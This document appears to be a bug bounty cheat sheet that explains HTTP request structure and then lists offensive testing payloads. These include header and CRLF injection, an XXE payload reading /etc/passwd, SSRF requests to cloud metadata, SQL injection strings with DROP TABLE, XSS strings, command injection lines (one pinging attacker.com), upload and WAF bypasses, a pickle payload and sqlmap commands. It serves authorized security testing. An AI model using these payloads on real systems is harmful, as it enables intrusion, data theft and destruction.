---

# Ultimate HTTP Request Cheat Sheet

### **1. What is an HTTP Request?**

An **HTTP request** is how your computer talks to websites and asks them to give you information. Imagine it's like ordering food at a restaurant:

- **You (the browser)**: "Hey, I want a pizza (webpage)!"
- **The Server (kitchen)**: "Here you go, here's your pizza (webpage)."

The way you "order" is through an HTTP request.

---

### **2. Basic Structure of an HTTP Request**

```
METHOD /path HTTP/1.1
Host: example.com
Header1: Value1
Header2: Value2

Body (only for some requests like POST)
```

- **METHOD**: Tells the server what you want to do (get info, send info, delete info, etc.).
- **/path**: The specific part of the website you’re asking for.
- **Headers**: Extra information that tells the server how to handle your request.
- **Body**: Data you send (only for certain methods like POST).

---

### **3. Common HTTP Methods (What You Want to Do)**

1. **GET** 📅
   - You’re asking the server to give you something (like a webpage or image).
   - **Example:** Viewing a webpage.

2. **POST** 📧
   - You’re sending information to the server (like filling out a form).
   - **Example:** Submitting a login form.

3. **PUT** 🔄
   - You’re updating existing info on the server.
   - **Example:** Updating your profile.

4. **DELETE** 🔎
   - You’re asking the server to delete something.
   - **Example:** Deleting a post.

5. **OPTIONS** 🔍
   - You’re asking what methods the server allows.
   - **Example:** Finding out if the server accepts GET, POST, etc.

---

### **4. Important HTTP Headers (Extra Info You Send)**

1. **Host**
   - Tells the server which website you’re asking for.
   - **Example:** `Host: example.com`

2. **User-Agent**
   - Tells the server what kind of device/browser you’re using.
   - **Example:** `User-Agent: Mozilla/5.0 (Windows NT 10.0)`

3. **Accept**
   - Tells the server what kind of response you want (like HTML, JSON, images).
   - **Example:** `Accept: text/html`

4. **Content-Type**
   - Tells the server what kind of data you’re sending in the request body.
   - **Example:** `Content-Type: application/json`

5. **Authorization**
   - Sends your credentials (like API keys or tokens) to access secure stuff.
   - **Example:** `Authorization: Bearer your_token_here`

6. **Cookie**
   - Sends cookies to the server (used for sessions/logins).
   - **Example:** `Cookie: session_id=abc123`

7. **Referer**
   - Tells the server where you came from (the previous page).
   - **Example:** `Referer: https://google.com`

8. **X-Forwarded-For**
   - Shows the original IP address when going through proxies.
   - **Example:** `X-Forwarded-For: 192.168.1.1`

9. **Origin**
   - Similar to Referer, but often used with APIs and CORS.
   - **Example:** `Origin: https://example.com`

10. **Cache-Control**
    - Tells the browser or server how to handle caching.
    - **Example:** `Cache-Control: no-cache`

---

# Bug Bounty Cheat Sheet - How to Spot Vulnerabilities in Requests

## HTTP Headers Analysis

### Critical Headers to Test

| Header | What to Check For | Potential Vulnerability | Test Examples |
|--------|------------------|------------------------|---------------|
| **Host** | Try changing to another domain | Host Header Injection, SSRF | `Host: evil.com` |
| **User-Agent** | Modify to bypass filters | WAF Bypass | `User-Agent: <script>alert(1)</script>` |
| **Authorization** | Test with invalid/missing tokens | Broken Authentication | Remove header, use expired tokens |
| **Referer/Origin** | Change to test CSRF protection | CSRF Vulnerability | `Origin: https://attacker.com` |
| **Cookie** | Modify session cookies | Session Hijacking | Change session IDs, role values |
| **Content-Type** | Change from JSON to XML | Content-Type Confusion, XXE | `application/xml` instead of `application/json` |
| **X-Forwarded-For** | Inject IPs to bypass restrictions | IP Spoofing, Rate Limit Bypass | `X-Forwarded-For: 127.0.0.1` |
| **X-Real-IP** | Similar to X-Forwarded-For | IP Spoofing | `X-Real-IP: 192.168.1.1` |
| **X-Originating-IP** | Test for IP whitelist bypass | Access Control Bypass | `X-Originating-IP: 10.0.0.1` |

### Header Injection Techniques

```http
# Host Header Injection
GET / HTTP/1.1
Host: target.com:evil.com
Host: target.com%0d%0aSet-Cookie: malicious=true

# Cache Poisoning via Host
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# CRLF Injection
GET / HTTP/1.1
User-Agent: Mozilla%0d%0aSet-Cookie: admin=true
```

## HTTP Status Codes - What They Mean for Bug Hunters

| Code | Meaning | What to Test | Potential Issues |
|------|---------|--------------|------------------|
| **200** | OK | Normal response | Test for hidden vulnerabilities in content |
| **301/302** | Redirect | Check redirect destination | Open Redirects |
| **400** | Bad Request | Input validation issues | SQLi, XSS, Command Injection |
| **401** | Unauthorized | Authentication required | Token manipulation, bypass |
| **403** | Forbidden | Access denied | Authorization bypass techniques |
| **404** | Not Found | Resource doesn't exist | Directory traversal, hidden endpoints |
| **405** | Method Not Allowed | HTTP method restricted | Try different methods (PUT, PATCH, DELETE) |
| **429** | Too Many Requests | Rate limiting active | Rate limit bypass techniques |
| **500** | Internal Server Error | Server-side error | SQLi, LFI, RFI, deserialization |
| **502/503** | Bad Gateway/Unavailable | Proxy/load balancer issues | SSRF, backend system access |

## Request Methods & Techniques

### HTTP Method Testing
```http
# Test all methods on endpoints
GET /admin HTTP/1.1
POST /admin HTTP/1.1
PUT /admin HTTP/1.1
DELETE /admin HTTP/1.1
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
HEAD /admin HTTP/1.1
TRACE /admin HTTP/1.1

# Method Override
POST /admin HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /admin HTTP/1.1
_method=PUT
```

### Parameter Pollution
```http
# HTTP Parameter Pollution
GET /search?query=safe&query=<script>alert(1)</script>

# JSON Parameter Pollution
{
  "user": "admin",
  "user": "guest",
  "role": "user"
}
```

## Content-Type Manipulation

### Dangerous Content-Type Changes

| Original | Change To | Potential Vulnerability |
|----------|-----------|------------------------|
| `application/json` | `application/xml` | XXE Injection |
| `application/json` | `text/xml` | XXE Injection |
| `application/x-www-form-urlencoded` | `application/json` | Logic flaws |
| `multipart/form-data` | `application/json` | File upload bypass |
| `text/plain` | `text/html` | XSS |

### XXE Testing
```http
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

## Authentication & Authorization Testing

### JWT Token Manipulation
```bash
# None algorithm attack
{
  "alg": "none",
  "typ": "JWT"
}

# Key confusion attack
{
  "alg": "HS256",  # Change from RS256
  "typ": "JWT"
}

# Weak secret bruteforce
hashcat -m 16500 jwt.txt rockyou.txt
```

### Session Testing
```http
# Session fixation
Cookie: JSESSIONID=ATTACKER_CONTROLLED_VALUE

# Session in URL
GET /dashboard?sessionid=ABC123

# Cookie manipulation
Cookie: role=admin; isLoggedIn=true; userId=1
```

## SSRF Testing Techniques

### Host Header SSRF
```http
GET / HTTP/1.1
Host: 169.254.169.254  # AWS metadata
Host: metadata.google.internal  # GCP metadata
Host: 127.0.0.1:22  # Internal services
```

### URL Parameter SSRF
```http
# Common parameters
GET /proxy?url=http://169.254.169.254/latest/meta-data/
GET /fetch?target=file:///etc/passwd
GET /redirect?next=gopher://127.0.0.1:11211/

# Bypass techniques
http://127.0.0.1
http://localhost
http://[::1]
http://0x7f000001
http://017700000001
http://2130706433
```

## Input Validation Testing

### SQL Injection Payloads
```sql
' OR '1'='1
' UNION SELECT 1,2,3--
'; DROP TABLE users;--
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
```

### XSS Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
<svg onload=alert('XSS')>
```

### Command Injection
```bash
; ls -la
| whoami
`id`
$(whoami)
& ping -c 4 attacker.com
```

## File Upload Testing

### Dangerous Extensions
```
.php .jsp .asp .aspx .py .rb .pl .cgi
.phtml .php3 .php4 .php5 .phar
.svg .xml .html .swf
```

### Bypass Techniques
```http
# Double extension
file.jpg.php

# Null byte (historical)
file.php%00.jpg

# Content-Type manipulation
Content-Type: image/jpeg
(but upload PHP file)

# Magic bytes manipulation
GIF89a<?php phpinfo(); ?>
```

## Rate Limiting & WAF Bypass

### Rate Limit Bypass
```http
# IP spoofing headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1

# Distributed requests
User-Agent: (rotate values)
```

### WAF Bypass Techniques
```http
# Case variation
SELECT vs SeLeCt vs sElEcT

# Comment insertion
UNI/**/ON SE/**/LECT

# Encoding
%53%45%4C%45%43%54 (URL encoding)
SELECT (HTML entity encoding)

# Alternative representations
' or 1=1# vs ' or 1 like 1#
```

## Advanced Testing Techniques

### Race Conditions
```python
# Concurrent requests to test race conditions
import threading
import requests

def make_request():
    requests.post('/transfer', data={'amount': 1000, 'to': 'attacker'})

threads = []
for i in range(10):
    t = threading.Thread(target=make_request)
    threads.append(t)
    t.start()
```

### Deserialization Testing
```python
# PHP Object Injection
O:8:"stdClass":1:{s:4:"evil";s:10:"phpinfo();";}

# Java Deserialization
aced0005...  # Look for serialized Java objects

# Python Pickle
cos\nsystem\n(S'id'\ntR.  # Pickle payload
```

### GraphQL Testing
```graphql
# Introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      ...FullType
    }
  }
}

# Query depth attack
query {
  user {
    posts {
      comments {
        user {
          posts {
            # ... deep nesting
          }
        }
      }
    }
  }
}
```

## Response Analysis

### Information Disclosure Signs
```
# Error messages revealing info
SQL error: You have an error in your SQL syntax
PHP Warning: include(/etc/passwd): failed to open stream
Stack trace: at com.example.UserController.getUser(UserController.java:45)

# Version disclosure
Server: nginx/1.14.0
X-Powered-By: PHP/7.2.0
X-AspNet-Version: 4.0.30319
```

### Timing Attacks
```python
import time
import requests

# SQL injection time-based
payload = "admin' AND (SELECT SLEEP(5))--"
start = time.time()
requests.post('/login', data={'username': payload})
end = time.time()

if end - start > 5:
    print("Potential SQL injection!")
```

## Quick Testing Checklist

### Every Request Should Be Tested For:
- [ ] **Input validation** in all parameters
- [ ] **Authentication bypass** techniques
- [ ] **Authorization** level changes
- [ ] **Content-Type** manipulation
- [ ] **HTTP method** variations
- [ ] **Header injection** possibilities
- [ ] **Rate limiting** bypass
- [ ] **Error message** information disclosure
- [ ] **Redirect** manipulation
- [ ] **File upload** vulnerabilities (if applicable)

### Tools for Testing
```bash
# Burp Suite extensions
- Param Miner
- Autorize
- Active Scan++
- Backslash Powered Scanner

# Command line tools
ffuf -w wordlist.txt -u http://target.com/FUZZ
sqlmap -u "http://target.com/page?id=1" --dbs
nuclei -t cves/ -u http://target.com
```

### Common Bypass Patterns
```
# URL encoding
%2e%2e%2f = ../
%2500 = null byte

# Unicode encoding
\u002e\u002e\u002f = ../
\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e = <script>

# Case manipulation
AdMiN instead of admin
SeLeCt instead of SELECT
```

Remember: Always test on authorized targets only and follow responsible disclosure practices!
---

### **7. Tools You Can Use**

1. **Burp Suite** 🔐
   - Intercept and modify HTTP requests.

2. **httpx** 🔢
   - Check for live hosts and analyze headers.

3. **ffuf/gobuster** 🤎
   - Brute-force directories and files.

4. **SQLMap** 🔢
   - Automatically detect and exploit SQL injection.

5. **Nuclei** 📊
   - Automated scanning for known vulnerabilities.

6. **wfuzz** 🔧
   - Fuzzing tool for testing different payloads.

---

This cheat sheet simplifies HTTP requests and shows you what to look out for in bug bounty hunting. Use this as a quick reference while analyzing traffic!

